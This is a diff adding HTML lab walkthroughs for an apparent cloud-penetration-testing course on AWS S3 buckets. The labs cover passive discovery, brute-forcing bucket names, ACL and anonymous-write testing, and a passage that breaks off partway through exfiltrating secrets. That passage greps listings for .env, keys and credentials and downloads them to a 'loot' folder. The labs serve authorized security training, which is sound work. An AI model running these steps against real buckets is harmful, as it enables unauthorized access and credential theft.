@@ -1,0 +1,808 @@
+<div class="labs-container" id="m01-labs">
+
+  <!-- ============================================================ -->
+  <!-- LAB 1: Passive Bucket Discovery                              -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M01-L01-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Discover S3 buckets associated with a target domain using passive OSINT &mdash; no direct interaction with target infrastructure.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured (<code>aws configure</code>)</li>
+        <li>Tools installed: <code>curl</code>, <code>jq</code>, <code>dig</code>, <code>host</code></li>
+        <li>Target domain name (e.g., <code>targetcorp.com</code>)</li>
+        <li>GrayHatWarfare API key (optional, for Step 4)</li>
+        <li>Authorized scope: confirm the target domain is within your authorized engagement scope</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Query Certificate Transparency logs via <strong>crt.sh</strong> to enumerate subdomains that may map to S3 buckets.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ curl -s "https://crt.sh/?q=%.targetcorp.com&output=json" | jq -r '.[].name_value' | sort -u | tee subdomains.txt</div>
+              <div class="terminal-output">assets.targetcorp.com
+cdn-uploads.targetcorp.com
+backup-data.targetcorp.com
+static.targetcorp.com
+www.targetcorp.com
+mail.targetcorp.com
+api.targetcorp.com
+dev.targetcorp.com</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Use Google dorks to find S3 buckets indexed by search engines. Run each query in your browser or via a search API.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># Google Dork queries &mdash; run in browser or automation</div>
+              <div class="terminal-output">site:s3.amazonaws.com "targetcorp"
+site:s3.amazonaws.com inurl:targetcorp
+"targetcorp" filetype:xml "ListBucketResult"
+site:amazonaws.com "targetcorp" ext:env OR ext:sql OR ext:bak
+inurl:"s3.amazonaws.com" "targetcorp-backup" OR "targetcorp-dev"</div>
+              <div class="terminal-cmd"># Save discovered bucket names to google.txt</div>
+              <div class="terminal-output">targetcorp-public-assets
+targetcorp-backup
+targetcorp-marketing-uploads</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Perform DNS CNAME lookups on discovered subdomains to identify those pointing directly to S3.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ dig +short CNAME assets.targetcorp.com</div>
+              <div class="terminal-output">assets.targetcorp.com.s3.amazonaws.com.</div>
+              <div class="terminal-cmd">$ host cdn-uploads.targetcorp.com</div>
+              <div class="terminal-output">cdn-uploads.targetcorp.com is an alias for cdn-uploads.targetcorp.com.s3.amazonaws.com.
+cdn-uploads.targetcorp.com.s3.amazonaws.com has address 52.217.44.100</div>
+              <div class="terminal-cmd">$ dig +short CNAME static.targetcorp.com</div>
+              <div class="terminal-output">d3abc123xyz.cloudfront.net.</div>
+              <div class="terminal-cmd"># Automate across all subdomains</div>
+              <div class="terminal-cmd">$ while read sub; do echo -n "$sub -> "; dig +short CNAME "$sub"; done &lt; subdomains.txt | grep s3.amazonaws | tee dns.txt</div>
+              <div class="terminal-output">assets.targetcorp.com -> assets.targetcorp.com.s3.amazonaws.com.
+cdn-uploads.targetcorp.com -> cdn-uploads.targetcorp.com.s3.amazonaws.com.
+backup-data.targetcorp.com -> backup-data.targetcorp.com.s3.amazonaws.com.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Search <strong>GrayHatWarfare</strong> for publicly indexed buckets matching the target keyword.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ curl -s "https://buckets.grayhatwarfare.com/api/v2/buckets?keyword=targetcorp" \
+  -H "Authorization: Bearer API_KEY" | jq '.buckets[].bucket'</div>
+              <div class="terminal-output">"targetcorp-public-assets"
+"targetcorp-backup"
+"targetcorp-logs-2024"
+"targetcorp-dev-uploads"</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Compile and deduplicate all discovered bucket names from every source into a master list.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat crtsh.txt google.txt dns.txt ghw.txt | sort -u > all_buckets.txt && wc -l all_buckets.txt</div>
+              <div class="terminal-output">7 all_buckets.txt</div>
+              <div class="terminal-cmd">$ cat all_buckets.txt</div>
+              <div class="terminal-output">assets.targetcorp.com
+backup-data.targetcorp.com
+cdn-uploads.targetcorp.com
+targetcorp-backup
+targetcorp-dev-uploads
+targetcorp-logs-2024
+targetcorp-public-assets</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Target Domain</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">crt.sh</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Subdomains</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">DNS CNAME</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">S3 Bucket Names</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Validate</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      Passive recon generates zero traffic to the target. Certificate Transparency logs, DNS records, and search engine caches are all public data sources that do not constitute unauthorized access.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> This lab is purely passive &mdash; no resources were created. Delete any local output files when the assessment is complete: <code>rm subdomains.txt dns.txt google.txt ghw.txt all_buckets.txt</code>
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 2: Brute-Forcing Bucket Names                            -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M01-L02-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Actively discover S3 buckets by brute-forcing common naming conventions derived from the target organization.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured (<code>aws configure</code>)</li>
+        <li>Python 3.8+ with pip installed</li>
+        <li>S3Scanner v3.x installed: <code>pip install s3scanner</code></li>
+        <li>Ruby runtime (for bucket_finder.rb, optional)</li>
+        <li>Target organization name to generate wordlist permutations</li>
+        <li>Authorized scope confirmed &mdash; active scanning generates HTTP requests to S3 endpoints</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Install <strong>S3Scanner</strong> v3.x from PyPI. This tool checks whether bucket names exist and tests their permissions.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ pip install s3scanner</div>
+              <div class="terminal-output">Collecting s3scanner
+  Downloading s3scanner-3.0.7-py3-none-any.whl (22 kB)
+Installing collected packages: s3scanner
+Successfully installed s3scanner-3.0.7</div>
+              <div class="terminal-cmd">$ s3scanner --version</div>
+              <div class="terminal-output">s3scanner 3.0.7</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Generate a wordlist based on common corporate naming conventions. Combine the company name with typical suffixes.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ cat &lt;&lt;'EOF' > wordlist.txt
+targetcorp-backup
+targetcorp-backups
+targetcorp-dev
+targetcorp-development
+targetcorp-prod
+targetcorp-production
+targetcorp-assets
+targetcorp-static
+targetcorp-staging
+targetcorp-stage
+targetcorp-logs
+targetcorp-uploads
+targetcorp-config
+targetcorp-data
+targetcorp-media
+targetcorp-internal
+targetcorp-private
+targetcorp-public
+targetcorp-db-backups
+targetcorp-terraform
+EOF</div>
+              <div class="terminal-cmd">$ wc -l wordlist.txt</div>
+              <div class="terminal-output">20 wordlist.txt</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Before testing public access, check whether <strong>Block Public Access (BPA)</strong> is enabled on any discovered bucket. If BPA is on, all anonymous access attempts will silently return <code>AccessDenied</code> regardless of ACL settings.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3api get-public-access-block --bucket targetcorp-backup</div>
+              <div class="terminal-output">{
+    "PublicAccessBlockConfiguration": {
+        "BlockPublicAcls": false,
+        "IgnorePublicAcls": false,
+        "BlockPublicPolicy": false,
+        "RestrictPublicBuckets": false
+    }
+}</div>
+              <div class="terminal-cmd"># All four settings are false — BPA is disabled. Anonymous access tests will work.</div>
+              <div class="terminal-cmd"># If any setting is true, public ACL/policy tests will be blocked by S3, not the bucket owner.</div>
+              <div class="terminal-cmd"># Example of BPA-enabled bucket (anonymous access blocked regardless of ACL):</div>
+              <div class="terminal-output">{
+    "PublicAccessBlockConfiguration": {
+        "BlockPublicAcls": true,
+        "IgnorePublicAcls": true,
+        "BlockPublicPolicy": true,
+        "RestrictPublicBuckets": true
+    }
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Run <strong>S3Scanner v3.x</strong> against the wordlist. The v3.x CLI uses <code>scan --bucket-file</code> and outputs JSON-style results showing existence and permission levels.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ s3scanner scan --bucket-file wordlist.txt</div>
+              <div class="terminal-output">{"bucket":"targetcorp-backup","exists":true,"region":"us-east-1","permissions":{"read":true,"write":false,"readAcl":false,"writeAcl":false},"anonPermissions":{"read":true,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-dev","exists":true,"region":"us-east-1","permissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false},"anonPermissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-backups","exists":false}
+{"bucket":"targetcorp-prod","exists":true,"region":"us-east-1","permissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false},"anonPermissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-assets","exists":true,"region":"us-east-1","permissions":{"read":true,"write":false,"readAcl":true,"writeAcl":false},"anonPermissions":{"read":true,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-staging","exists":false}
+{"bucket":"targetcorp-logs","exists":true,"region":"us-east-1","permissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false},"anonPermissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-stage","exists":false}
+{"bucket":"targetcorp-uploads","exists":true,"region":"us-east-1","permissions":{"read":true,"write":true,"readAcl":true,"writeAcl":false},"anonPermissions":{"read":true,"write":true,"readAcl":true,"writeAcl":false}}
+{"bucket":"targetcorp-config","exists":false}
+{"bucket":"targetcorp-data","exists":false}
+{"bucket":"targetcorp-media","exists":true,"region":"us-east-1","permissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false},"anonPermissions":{"read":false,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-internal","exists":false}
+{"bucket":"targetcorp-private","exists":false}
+{"bucket":"targetcorp-public","exists":false}
+{"bucket":"targetcorp-db-backups","exists":false}
+{"bucket":"targetcorp-terraform","exists":false}
+{"bucket":"targetcorp-development","exists":false}
+{"bucket":"targetcorp-production","exists":false}
+{"bucket":"targetcorp-static","exists":false}</div>
+              <div class="terminal-cmd"># Filter for existing buckets with any anonymous read access</div>
+              <div class="terminal-cmd">$ s3scanner scan --bucket-file wordlist.txt | jq -c 'select(.exists==true and .anonPermissions.read==true)'</div>
+              <div class="terminal-output">{"bucket":"targetcorp-backup","exists":true,"region":"us-east-1","anonPermissions":{"read":true,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-assets","exists":true,"region":"us-east-1","anonPermissions":{"read":true,"write":false,"readAcl":false,"writeAcl":false}}
+{"bucket":"targetcorp-uploads","exists":true,"region":"us-east-1","anonPermissions":{"read":true,"write":true,"readAcl":true,"writeAcl":false}}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Verify bucket accessibility using the AWS CLI with <code>--no-sign-request</code> for anonymous access. Only attempt this on buckets where S3Scanner confirmed BPA is disabled and anonymous read is permitted.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3 ls s3://targetcorp-backup --no-sign-request</div>
+              <div class="terminal-output">                           PRE config/
+                           PRE uploads/
+                           PRE logs/
+2024-03-15 09:22:31       1247 .env
+2024-03-14 18:45:02      34521 database-backup.sql.gz
+2024-03-12 11:33:19       8192 credentials.csv</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+      <div class="flow-diagram">
+        <div class="flow-node">Target Name</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Naming Patterns</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">Check BPA</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">S3Scanner v3</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node">AWS CLI Verify</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node highlight">Access Confirmed</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-circle-info"></i>
+      Active brute-forcing generates HTTP requests to S3. AWS does not rate-limit these checks aggressively, but be aware that the <em>target</em> cannot see your requests &mdash; only AWS can. S3 access logging on the bucket would capture your IP if you successfully list or read objects. Always confirm BPA status before interpreting negative results from anonymous access tests &mdash; a denied response may be BPA enforcement, not a secured bucket.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong> No AWS resources were created in this lab. Delete local output files: <code>rm wordlist.txt</code>. If you uploaded any test objects in a prior step, remove them: <code>aws s3 rm s3://&lt;bucket&gt;/&lt;test-object&gt; --no-sign-request</code>
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 3: Identifying ACL Misconfigurations                     -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M01-L03-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Determine the access level of discovered S3 buckets by systematically testing ACL permissions.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured (<code>aws configure</code>)</li>
+        <li>Target bucket name identified from Lab 1 or Lab 2 (e.g., <code>targetcorp-backup</code>)</li>
+        <li>Lab environment bucket with ACLs enabled (ACLs are disabled by default on buckets created after April 2023; this lab requires a bucket with ACLs explicitly enabled for the attack simulation)</li>
+        <li>Authorized scope confirmed for the target bucket</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Before any ACL or anonymous access tests, check whether <strong>Block Public Access (BPA)</strong> is enabled. If BPA is on, public ACL grants are ignored by S3 and tests will return <code>AccessDenied</code> even for buckets with permissive ACLs.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3api get-public-access-block --bucket targetcorp-backup</div>
+              <div class="terminal-output">{
+    "PublicAccessBlockConfiguration": {
+        "BlockPublicAcls": false,
+        "IgnorePublicAcls": false,
+        "BlockPublicPolicy": false,
+        "RestrictPublicBuckets": false
+    }
+}</div>
+              <div class="terminal-cmd"># All four values are false — BPA is disabled. ACL-based public access is in effect.</div>
+              <div class="terminal-cmd"># If BlockPublicAcls=true OR IgnorePublicAcls=true, ACL grants to AllUsers are blocked/ignored.</div>
+              <div class="terminal-cmd"># If RestrictPublicBuckets=true, even bucket-policy public grants are blocked.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">Retrieve the bucket ACL to see who has what permissions. Look for grants to <code>AllUsers</code> or <code>AuthenticatedUsers</code>.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3api get-bucket-acl --bucket targetcorp-backup --no-sign-request</div>
+              <div class="terminal-output">{
+    "Owner": {
+        "DisplayName": "targetcorp-admin",
+        "ID": "a3bce8f1d2e4..."
+    },
+    "Grants": [
+        {
+            "Grantee": {
+                "Type": "CanonicalUser",
+                "ID": "a3bce8f1d2e4..."
+            },
+            "Permission": "FULL_CONTROL"
+        },
+        {
+            "Grantee": {
+                "Type": "Group",
+                "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
+            },
+            "Permission": "FULL_CONTROL"
+        }
+    ]
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Test anonymous <strong>read</strong> access by listing bucket contents without credentials.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3 ls s3://targetcorp-backup --no-sign-request</div>
+              <div class="terminal-output">                           PRE config/
+                           PRE uploads/
+                           PRE db-dumps/
+2024-03-15 09:22:31       1247 .env
+2024-03-14 18:45:02      34521 database-backup.sql.gz
+2024-03-12 11:33:19       8192 credentials.csv
+2024-03-10 07:18:55        442 deploy-keys.pem</div>
+              <div class="terminal-cmd"># Also check read on a specific object</div>
+              <div class="terminal-cmd">$ aws s3api head-object --bucket targetcorp-backup --key .env --no-sign-request</div>
+              <div class="terminal-output">{
+    "ContentLength": 1247,
+    "ContentType": "application/octet-stream",
+    "LastModified": "2024-03-15T09:22:31+00:00",
+    "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\""
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Test anonymous <strong>write</strong> access by uploading a benign proof-of-concept file.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ echo "poc-test — authorized security assessment $(date)" > /tmp/test.txt</div>
+              <div class="terminal-cmd">$ aws s3 cp /tmp/test.txt s3://targetcorp-backup/poc/security-test.txt --no-sign-request</div>
+              <div class="terminal-output">upload: /tmp/test.txt to s3://targetcorp-backup/poc/security-test.txt</div>
+              <div class="terminal-cmd"># Verify the upload</div>
+              <div class="terminal-cmd">$ aws s3 ls s3://targetcorp-backup/poc/ --no-sign-request</div>
+              <div class="terminal-output">2024-03-16 14:05:22         58 security-test.txt</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 5 -->
+      <div class="lab-step">
+        <div class="step-num">5</div>
+        <div class="step-content">
+          <div class="step-desc">Check the <strong>bucket policy</strong> for additional permission grants that may override or extend ACLs.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3api get-bucket-policy --bucket targetcorp-backup --no-sign-request | jq .</div>
+              <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "PublicReadGetObject",
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": [
+                "arn:aws:s3:::targetcorp-backup",
+                "arn:aws:s3:::targetcorp-backup/*"
+            ]
+        }
+    ]
+}</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 6 -->
+      <div class="lab-step">
+        <div class="step-num">6</div>
+        <div class="step-content">
+          <div class="step-desc">Classify the misconfiguration severity. Combine ACL and policy findings into a risk assessment.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd"># ACL Misconfiguration Classification</div>
+              <div class="terminal-output">
++-------------------------+----------+-------------------------------------------+
+| Permission Level        | Severity | Impact                                    |
++-------------------------+----------+-------------------------------------------+
+| Private (default)       | None     | Only owner can access                     |
+| AuthenticatedUsers READ | Medium   | Any AWS account can list/read objects     |
+| AllUsers READ           | High     | Anyone on the internet can read           |
+| AllUsers WRITE          | Critical | Anyone can upload/overwrite objects        |
+| AllUsers FULL_CONTROL   | Critical | Anyone can read, write, and modify ACLs   |
++-------------------------+----------+-------------------------------------------+
+
+Finding: targetcorp-backup
+  BPA:    All settings disabled  [REQUIRED FOR EXPLOIT]
+  ACL:    AllUsers = FULL_CONTROL  [CRITICAL]
+  Policy: Principal * = GetObject, ListBucket  [HIGH]
+  Verdict: Fully open — read, write, ACL modification</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="attack-flow">
+      <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> ACL Severity Levels</div>
+      <div class="flow-diagram">
+        <div class="flow-node flow-green">Private</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node flow-yellow">Auth READ</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node flow-orange">All READ</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node flow-red">All WRITE</div>
+        <div class="flow-arrow">&rarr;</div>
+        <div class="flow-node flow-critical">FULL_CONTROL</div>
+      </div>
+    </div>
+
+    <div class="lab-note">
+      <i class="fa-solid fa-triangle-exclamation"></i>
+      <strong>Always clean up test files after verifying write access.</strong> Run <code>aws s3 rm s3://targetcorp-backup/poc/security-test.txt --no-sign-request</code> immediately after documenting the finding. Leaving files in a client's bucket is unprofessional and may cause operational issues.
+    </div>
+
+    <div class="lab-cleanup">
+      <i class="fa-solid fa-broom"></i>
+      <strong>Cleanup:</strong>
+      <ol>
+        <li>Remove the PoC test file: <code>aws s3 rm s3://targetcorp-backup/poc/security-test.txt --no-sign-request</code></li>
+        <li>Verify the object is gone: <code>aws s3 ls s3://targetcorp-backup/poc/ --no-sign-request</code></li>
+        <li>Delete the local test file: <code>rm /tmp/test.txt</code></li>
+        <li>Document the ACL misconfiguration in your report before the client remediates it</li>
+      </ol>
+    </div>
+  </div>
+
+  <hr class="lab-divider">
+
+  <!-- ============================================================ -->
+  <!-- LAB 4: Extracting Secrets from Open Buckets                  -->
+  <!-- ============================================================ -->
+  <div class="lab-walkthrough-content" id="M01-L04-content">
+    <div class="lab-objective">
+      <i class="fa-solid fa-crosshairs"></i>
+      <strong>Objective:</strong> Exfiltrate sensitive files and credentials from misconfigured S3 buckets, then validate extracted credentials.
+    </div>
+
+    <div class="lab-prereqs">
+      <i class="fa-solid fa-list-check"></i>
+      <strong>Prerequisites:</strong>
+      <ul>
+        <li>AWS CLI v2 installed and configured (<code>aws configure</code>)</li>
+        <li>Target bucket confirmed accessible (from Lab 2 or Lab 3) with BPA disabled and anonymous read enabled</li>
+        <li>Tools installed: <code>jq</code>, <code>grep</code>, <code>mysql</code> client (optional, for credential validation)</li>
+        <li>Sufficient local disk space for downloaded loot files</li>
+        <li>Authorized scope confirmed &mdash; downloading files constitutes active interaction with target data</li>
+      </ul>
+    </div>
+
+    <div class="lab-steps">
+
+      <!-- Step 1 -->
+      <div class="lab-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-desc">Confirm BPA is disabled on the target bucket before proceeding with anonymous access attempts.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3api get-public-access-block --bucket targetcorp-backup</div>
+              <div class="terminal-output">{
+    "PublicAccessBlockConfiguration": {
+        "BlockPublicAcls": false,
+        "IgnorePublicAcls": false,
+        "BlockPublicPolicy": false,
+        "RestrictPublicBuckets": false
+    }
+}</div>
+              <div class="terminal-cmd"># BPA is fully disabled — anonymous access via --no-sign-request will work</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="lab-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-desc">List all objects recursively to get a full inventory of the bucket contents.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3 ls s3://targetcorp-backup/ --recursive --no-sign-request</div>
+              <div class="terminal-output">2024-03-15 09:22:31       1247 .env
+2024-03-14 18:45:02      34521 database-backup.sql.gz
+2024-03-12 11:33:19       8192 credentials.csv
+2024-03-10 07:18:55        442 deploy-keys.pem
+2024-03-09 22:14:33       2048 config/database.yml
+2024-03-09 21:55:01        512 config/secrets.yml
+2024-03-08 16:30:44     102400 db-dumps/users_export.sql
+2024-03-07 10:22:18      45056 uploads/avatar_001.jpg
+2024-03-06 08:11:29      32768 uploads/avatar_002.jpg
+2024-03-05 14:09:55       4096 terraform/terraform.tfstate
+2024-03-04 19:27:33        256 .git-credentials</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="lab-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-desc">Filter the listing for high-value targets &mdash; configuration files, credentials, keys, and secrets.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ aws s3 ls s3://targetcorp-backup/ --recursive --no-sign-request | \
+  grep -iE '\.env|credentials|\.pem|\.key|password|config|secret|\.tfstate|\.git'</div>
+              <div class="terminal-output">2024-03-15 09:22:31       1247 .env
+2024-03-12 11:33:19       8192 credentials.csv
+2024-03-10 07:18:55        442 deploy-keys.pem
+2024-03-09 22:14:33       2048 config/database.yml
+2024-03-09 21:55:01        512 config/secrets.yml
+2024-03-05 14:09:55       4096 terraform/terraform.tfstate
+2024-03-04 19:27:33        256 .git-credentials</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="lab-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-desc">Download high-value files to a local <code>loot/</code> directory for analysis.</div>
+          <div class="terminal">
+            <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+            <div class="terminal-body">
+              <div class="terminal-cmd">$ mkdir -p ./loot</div>
+              <div class="terminal-cmd">$ aws s3 cp s3://targetcorp-backup/.env ./loot/ --no-sign-request</div>
+              <div class="terminal-output">download: s3://targetcorp-backup/.env to ./loot/.env</div>
